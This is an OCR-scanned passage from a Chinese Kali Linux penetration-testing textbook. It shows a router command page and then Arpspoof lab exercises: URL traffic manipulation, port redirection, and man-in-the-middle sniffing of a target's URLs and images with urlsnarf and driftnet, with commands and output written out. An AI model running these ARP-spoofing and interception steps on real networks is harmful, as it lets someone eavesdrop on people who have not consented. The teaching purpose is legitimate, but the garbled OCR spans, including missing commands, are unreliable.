RE packets:31374498 errore10 dropped:36002 overrune:0 frane:0
TE packets:26320788 errors:0 dropped:1 owerruns:9613 carrier:0
col1isions:0 txgueuelem:900
盗看进程
RE bytee:1942057706 (1.8 GiB)TE bytes:1137624415 (1.0 GiB)
查看网络
th0. 1
Link encap:Ethernet HWaddr 6C:E8:73:F9:3C:C0
UP BROAUCAST INNING WLTICASTMTU:150OWetrie11
查看路由
R packets:221878395 errors:0 drogped:0 owerruns:0 fraae:0
TE packets:244867896 errors:0 dropped:0 owerruns:0 carrier:0
查看NAT
RI bytea:2668220808 (2.4 GiB)TI bytes:3327681029 (3.0 GiB)
collirions:0 txgueelem:0
查看内存
h0, 2
Link encap:EthernetHWaddr 6C:E8:73:F9:3C:C1
查看内核模块
R packets:244353222errors:0 dropped:0 oegruns:0-fra:
UP BROADCAST RINNISG WILTICASTXTU:150OMetriC:1
TL packets:217660508errors:0 dropped:0 overung:0 carrier:0
查看防火墙
图9.47路由器的网络连接信息
（5）从该界面可以看到路由器中，所有连接的网络接口信息，如接口的IP地址、MAC
地址和传输速率等。如果想要通过执行命令查看，则在指令框中输入ifconfig命令。然后
单击“发送”按钮，如图9.48所示。
D TL-WR1041N
→C192.168.0.1/userRpmNatDebugRpm26525557/linux_cmdine.html
=
用户名
osteam
密码
上一条下一条
指令
icontg
发送
清空
退出
图9.48运行命令查看网络信息
9.8
Arpspoof工具
Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通
· 305 ·
---
## Page 318
第3篇各种渗透测试
信，该工具通过替换传输中的数据从而达到对目标的欺骗。本节将介绍Arpspoof工具的
使用。
9.8.1URL流量操纵攻击
URL流量操作非常类似于中间人攻击，通过目标主机将路由流量注入到因特网。该过
程将通过ARP注入实现攻击。本小节将介绍使用Arpspoof工具实现URL流量操纵攻击。
使用Arpspoof工具实现URL流量操作攻击。具体操作步骤如下所示：
（1）开启路由转发功能。执行命令如下所示：
root@kali:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
执行以上命令后，没有任何信息输出。
（2）启动Arpsp0of注入攻击目标系统。攻击的方法是攻击者（192.168.6.102）发送
ARP数据包，以欺骗网关（192.168.6.1）和目标系统（192.168.6.101）。下面首先欺骗目
标系统，执行命令如下所示：
root@kali:~# arpspoof -i eth0 -t 192.168.6.101 192.168.6.1
50:e5:49:eb:46:8d 0:19:21:3f:c3:e5 0806 42: arp reply 192.168.6.1 is-at 50:e5:49:eb:46:8d
50:e5:49:eb:46:8d 0:19:21:3f:c3:e5 0806 42: arp reply 192.168.6.1 is-at 50:e5:49:eb:46:8d
50:e5:49:eb:46:8d 0:19:21:3f:c3:e5 0806 42: arp reply 192.168.6.1 is-at 50:e5:49:eb:46:8d
50:e5:49:eb:46:8d 0:19:21:3f:c3:e5 0806 42: arp reply 192.168.6.1 is-at 50:e5:49:eb:46:8d
50:e5:49:eb:46:8d 0:19:21:3f:c3:e5 0806 42: arp reply 192.168.6.1 is-at 50:e5:49:eb:46:8d
50:e5:49:eb:46:8d 0:19:21:3f:c3:e5 0806 42: arp reply 192.168.6.1 is-at 50:e5:49:eb:46:8d
50:e5:49:eb:46:8d 0:19:21:3f:c3:e5 0806 42: arp reply 192.168.6.1 is-at 50:e5:49:eb:46:8d
输出的信息显示了攻击者向目标主机192.168.6.102发送的数据包。其中
50:e5:49:eb:46:8d表示攻击者的MAC地址：19:21:3f:c3:e5表示192.168.6.101的MAC地址。
当以上过程攻击成功后，目标主机192.168.6.101给网关192.168.6.1发送数据时，都将发
送到攻击者192.168.6.102上。
（3）使用Arpspoof注入攻击网关。执行命令如下所示：
root@kali:~# arpspoof -i eth0 -t 192.168.6.1 192.168.6.101
50:e5:49:eb:46:8d 14:e6:e4:ac:fb:20 0806 42: arp reply 192.168.6.101 is-at 50:e5:49:eb:46:8d
50:e5:49:eb:46:8d 14:e6:e4:ac:fb:20 0806 42: arp reply 192.168.6.101 is-at 50:e5:49:eb:46:8d
以上输出信息显示了攻击者向网关192.168.6.1发送的数据包。当该攻击成功后，网关
192.168.6.1发给目标系统192.168.6.101上的信息发送到攻击者主机192.168.6.102上。
（4）以上步骤都执行成功后，攻击者就相当于控制了网关与目标主机传输的数据。攻
击者可以通过收到的数据，查看到目标系统上重要的信息。
为了验证以上的信息，下面举一个简单的例子。
【实例9-7】通过使用Wireshark抓包验证Arpspoof工具的攻击。具体操作步骤如下
306·
---
## Page 319
第9章无线网络渗透测试
所示。
（1）启动Wireshark工具。在KaliLinux桌面依次选择“应用程序”KaliLinuxTop10
SecurityToolswireshark命令，将显示如图9.49所示的界面。
The Wireshark Network Analyzer [Wireshark 1.10.2 (SVN Rev 51934 from /tr  o ×
=XCIQ→+
Filter:
Expression.
WIRESHARK
The World'sMost Popular Network Protoco
Version 1.10.2 (SVN Rev 51934 from /trunk-1.10)
Capture
Files
Interface List
Open
Opena previet
ly captured fie
Open Recent:
Start
J 1ou] deod ee/dosxseQ/
Chease one or more int erfaces to capture from, then Stat
/root/targethost.pcap (22 k8)
 etho
/tmp/targethost.pcap [not found]
 nflog
 an
Sample Captures
Ready to load or capture
No
Profile: Default
图 9.49
Wireshark启动界面
（2）在该界面Start下面，选择要捕获的接口。
这里选择etho，然后单击Start按钮，
将显示如图9.50所示的界面。
*ethO [Wireshark 1.10.2 (SVN Rev 51934 from /trunk-1.10)]
File
Edit ViewGo Capture AnalyzeStatistics Telephony Tools Internals Help
Filter
 Expression.
No.
Time
Source
Destination
Protocol
12014-05-14 08:51:40.693
3304CVmware_c0:00:0B
Broadcast
ARP
2 2014-05-14 08:51:41.693295t Vmware_c0: 00: 0B
Broadcast
ARP
ooooff ff ff ff ff ff oo 50
0010 08 00 06 04 00 01 00 50
156 c0 00 08 08 06 00 01
156 c0 00 08 c0 a8 29 01
.......P V....
0020
00 00 00 00 00 00 c0 a8
129 02 00 00 00 00 00 00
 File: /tmp/wireshark_pcapng-etho.
Profile: Default
图9.50抓包界面
（3）该界面可以对Wireshark进行相关设置及启动、停止和刷新数据包。
（4）在目标系统192.168.6.101上ping网关192.168.6.1。执行命令如下所示：
C:IUsers\Administrator>ping 192.168.6.1
以上命令执行完后，到Kali下查看Wireshark抓取的数据包，如图9.51所示。
·307 *
---
## Page 320
第3篇各种渗透测试
*ethO [Wireshark 1.10.2 (SVN Rev 51934 from /trunk-1.10]
File Edt ViewGo Capture Analyze Statistics Telephony Tools Internals Help
Filter:
Expression.
Cleat
Apply
保存
No.  Time
 Source
DestinationProtocol Lengtt  Info
28 2814-05-14 07:15:38 192.168.6.101 192.168.6.1ICMP
74 Echo (ping) request
29 2014-85-14 07:15:38 192.168.6.102 192,168,6.181 ICHMP
182Redirect
(Redirect for host)
58 2814-85-14 07:15:38 192.168.6.181 192.168.6.1ICHP
74 Echo (ping) request
312814-85-14 07:15:38 192.168.6.1192.168.6.181 ICHMP
74 Echo (ping)reply
1d-Ox0001,seq=13/3328,ttl=12
 d=0x0001, s+q=13/3328,
ttl=64
32 2014-05-14 卷7:15:38 192.168.6.102192.168.6.1ICHP
e2Redarect
(Redirect for host)
5 2814-65-14 67:15:38 192.168.6.1
192.168.6,181ICAP
4 Echo (ping)reply
Frane 28: 74 bytes on vire (592 bits), 74 bytes captured (592 bits) on interface 0
Ethernet I1, Src: Elitegro_3f :c3:e5 (00:19:21:3f :c3:e5) , Dst: Giga-Byt_eb:46:8d (50:e5:49:eb:46:8d)
Internet Protocol. version 4, Src: 192.168.6.101 (192.168.6.101), Dst: 192.168.6. (192.168.6.1)
Internet Control Message Protocol.
0000 50 e5 49 eb 46 8d 00 19 21 3f c3 e5 08 00 45 00F
a9 60 c0 aB 06 65 c0 a8
P.I.F... !?....E.
0020
10 08 00 00 ee E0 2E 00
06 01 08 00 4d 4e 00 01
99 S9 19 E9 Z9 19 P0 00
......bedef
CEOC
67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 769
ghijkLnn opqrstuv
 File:/tmp/wireshark_papng-etho.Packets: 83 Displayed 83 (100.%) Droppe Profle: Default
图9.51捕获的数据包
（5）该界面显示了192.168.6.101与192.168.6.1之间数据传输的过程。其中传输整个
过程的编号为28-33，28-30是一个请求数据包过程，31-33是目标响应数据包过程。下面
详细分析捕获的数据包。
口28：表示192.168.6.101（源）向192.168.6.1（目标）发送ping请求。
口29：表示192.168.6.102将192.168.6.101的数据包进行转发。
口30：表示192.168.6.102将转发后的数据包，再向192.168.6.1发送请求。
口31：表示目标主机192.168.6.1响应192.168.6.101的请求。
口32：表示该响应被发送到192.168.6.102上，此时该主机转发到192.168.6.1。
口33：目标主机192.168.6.1将转发的数据发送给192.168.6.101上。
9.8.2端口重定向攻击
端口重定向又叫端口转发或端口映射。端口重定向接收到一个端口数据包的过程（如
80端口），并且重定向它的流量到不同的端口（如8080）。实现这类型攻击的好处就是可
以无止境的，因为可以随着它重定向安全的端口到未加密端口，重定向流量到指定设备的
一个特定端口上。本小节将介绍使用Arpspoof实现端口重定向攻击。使用Arpspoof实现
端口重定向攻击。具体操作步骤如下所示。
（1）开启路由转发攻击。执行命令如下所示：
root@kali:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
（2）启动Arpspoof工具注入流量到默认网络。例如，本例中的默认网关地址为
192.168.6.1。执行命令如下所示：
root@kali:~# arpspoof -i eth0 192.168.6.1
在KaliLinux上执行以上命令后，没有任何输出信息。这是Kali1.0.6上的一个bug，
·308 ·
---
## Page 321
第9章无线网络渗透测试
因为在该系统中dsniff 软件包的版本是dsniff-2.4b1+debian-22。执行arpspoof命令不指定
目标系统时，只有在dsniff软件包为dsniff-2.4b1+debian-21.1上才可正常运行。
（3）添加一条端口重定向的防火墙规则。执行命令如下所示：
8080
执行以上命令后，没有任何输出。
以上设置成功后，当用户向网关192.168.6.1的80端口发送请求时，将会被转发为8080
端口发送到攻击者主机上。
9.8.3捕获并监视无线网络数据
使用中间人攻击的方法，可以使KaliLinux操作系统处在目标主机和路由器之间。这
样，用户就可以捕获来自目标主机的所有数据。本小节将介绍通过使用Arpspoof工具实施
中间人攻击，进而捕获并监视无线网络数据。
（1）开启路由器转发功能。执行命令如下所示：
root@Kali:~#echo 1 > /proc/sys/net/ipv4/ip_forward
（2）使用Arpspoof命令攻击主机。执行命令如下所示：
0:c:29:7a:59:75 0:c:29:fc:a9:25 0806 42: arp reply 192.168.6.1 is-at 0:c:29:7a:59:75
0:c:29:7a:59:75 0:c:29:fc:a9:25 0806 42: arp reply 192.168.6.1 is-at 0:c:29:7a:59:75
0:c:29:7a:59:75 0:c:29:fc:a9:25 0806 42: arp reply 192.168.6.1 is-at 0:c:29:7a:59:75
0:c:29:7a:59:75 0:c:29:fc:a9:25 0806 42: arp reply 192.168.6.1 is-at 0:c:29:7a:59:75
0:c:29:7a:59:75 0:c:29:fc:a9:25 0806 42: arp reply 192.168.6.1 is-at 0:c:29:7a:59:75
0:c:29:7a:59:75 0:c:29:fc:a9:25 0806 42: arp reply 192.168.6.1 is-at 0:c:29:7a:59:75
0:c:29:7a:59:75 0:c:29:fc:a9:25 0806 42: arp reply 192.168.6.1 is-at 0:c:29:7a:59:75
0:c:29:7a:59:75 0:c:29:fc:a9:25 0806 42: arp reply 192.168.6.1 is-at 0:c:29:7a:59:75
0:c:29:7a:59:75 0:c:29:fc:a9:25 0806 42: arp reply 192.168.6.1 is-at 0:c:29:7a:59:75
.....
执行以上命令表示告诉192.168.6.106（目标主机），网关的MAC地址是
00:0c:29：7a:59：75（攻击主机）。当目标主机收到该消息时，将会修改ARP缓存表中对应
的网关ARP条目。执行以上命令后，不会自动停止。如果不需要攻击时，按下Ctrl+C组
合键停止攻击。
（3）查看目标主机访问URL地址的信息。执行命令如下所示：
root@kali:~# urlsnarf -i eth0
urlsnarf: listening oneth0[tcp port 80 or port 8080or port 3128]
192.168.6.106 -- [16/Jul/2014:13:12:30 +0800] *GET http://192.168. 6.1:1900/igd.xml HTTP/1.1* -
 *-"*Microsoft-Windows/6.1 UPnP/1.0"
192.168.6.106 - - [16/Jul/2014:13:12:30 +0800] *GET http://192.168. 6.1:1900/I3f.xml HTTP/1.1* -
-"-"“Microsoft-Windows/6.1 UPnP/1.0*
192.168.6.106 - - [16/Jul/2014:13:12:30 +0800] *GET http://192.168. 6.1:1900/ifc.xml HTTP/1.1* -
 *-" *Microsoft-Windows/6.1 UPnP/1.0"
192.168.6.106 - - [16/Jul/2014:13:12:33 +0800] *GET http://192.168. 6.1:1900/ipc.xml HTTP/1.1* -
"“Microsoft-Windows/6.1UPnP/1.0”
192.168.6.106 -- [16/Jul/2014:13:12:37 +0800] *GET http://192.168. 6.1:1900/igd.xml HTTP/1.1*-
·309 ·
---
## Page 322
第3篇各种渗透测试
."""Microsoft-Windows/6.1 UPnP/1.0"
192.168.6.106 - - [16/Jul/2014:13:12:37 +0800] "POST http://192.168. 6.1:1900/ipc HTTP/1.1" - -
"" "Microsoft-Windows/6.1 UPnP/1.0”
"* "Microsoft-Windows/6.1 UPnP/1.0"
192.168.6.106 - - [16/Jul/2014:13:12:37 +0800] "POST http://192.168. 6.1:1900/ipc HTTP/1.1" - -
"" "Microsoft-Windows/6.1 UPnP/1.0"
192.168.6.106 - - [16/Jul/2014:13:12:37 +0800] *POST http://192.168. 6.1:1900/ifc HTTP/1.1” -
"* "Microsoft-Windows/6.1 UPnP/1.0"
以上输出的信息显示了目标主机访问互联网的信息。
（4）用户还可以使用Driftnet工具，捕获目标系统浏览过的图片。执行命令如下所示：
root@kali:~# driftnet -i eth0
执行以上命令后，将会打开一个窗口。当目标主机访问到网页中有图片时，将会在该
窗口中显示。
（5）现在到目标主机上，访问互联网以产生捕获信息。例如，随便在目标主机上通过
浏览器访问某个网页，攻击主机将显示如图9.52所示的界面。
driftnet
-□x
AP
图9.52目标主机访问的图片
（6）该界面显示了目标主机上访问的所有图片。现在用户可以通过点击图9.52中的任
何一张图片，该图片将被保存到Kali主机上。此时driftnet命令下，将会出现如下所示的
信息：
root@kali:~# driftnet -i eth0
driftnet: saving/tmp/drifnet-YbOziq/driftnet-53c9d45c168e121f.png'asdriftnet-0.png
driftnet:saving/tmp/drifnet-YbOziq/driftnet-53c9d4ca5d888a08.jpeg'asdriftnet-2.jpeg
driftnet: saving/tmp/drifnet-YbOziq/driftnet-53c9d4d92a6de806.png' as^driftnet-3.png
driftnet: saving/tmp/drifnet-YbOziq/driftnet-53c9d5351a9a9e69.png'as‘driftnet-5.png
从上面可以看到，保存了driftnet 捕获到的7张图片。其文件名分别为 driftnet-*.png，
并且这些文件默认保存当前目录下。
（7）用户可以使用Linux自带的图像查看器查看，如图9.53所示。
• 310 ·
---
## Page 323
第9章无线网络渗透测试
driftnet-4.jpeg
图像（)编辑(E)
查看(V）转到(G）帮助(H)
←上一张
图像属性
常规
名称：
driftnet-4.ipeg
KALI LINUK
宽度：
121像素
高度：
75保素
类型：
文件大小：
11.1 KB
文件央：
第7张，共13张
图9.53捕获的图片
（8）该界面显示的是第四张图片。用户可以通过单击“下一张”或“上一张”按钮，
切换捕获到的图片。
· 311 ·
---
## Page 324
精品图书推荐
Wireshark
数据包分析实战详解
通过80个实例，详解Wireshark数据包分析的8大类技巧
层层剥茧地剖析了12种常见网络协议的构成
Linux
从入门到精通
Linux经典畅销书，累计12次印刷，畅销近40000册
荣获51CTO社区“最受读者喜爱的原创IT技术图书奖”
Shell
从入门到精通
ChinaUnix社区力荐，Shel学习终极实战秘笈
300个实例，2个项目案例，15小时配套教学视频
LinuxShell
命令行及脚本编程实例详解
ChinaUnix社区力荐，资深Linux运维专家的经验总结
50个Linux常用命令，700个应用示例，25小时教学视频
---
## Page 325
Kali Linux
渗透测试技术详解
本书涵盖的精华内容
搭建KaliLinux环境
MNessus
MVMwareWorkstation
OpenVAS
信息收集
漏洞利用
枚举服务
MMetasploit
测试网络范围
权限提升
端口扫描
社会工程学工具包SET
指纹识别
密码攻击
漏洞扫描
M无线网络渗透测试
本书配套资源获取方式
本书涉及的相关工具等配套资源需要读者自行下载。请在清华大学出版社的网站上搜索到本书页
面，然后按照提示下载即可。
上架建议：计算机/网络安全
ISBN 978-7-302-38964-4
清华大学出版社数字出版网站
WQBOK
www.wqbook.com
定价：59.80元
---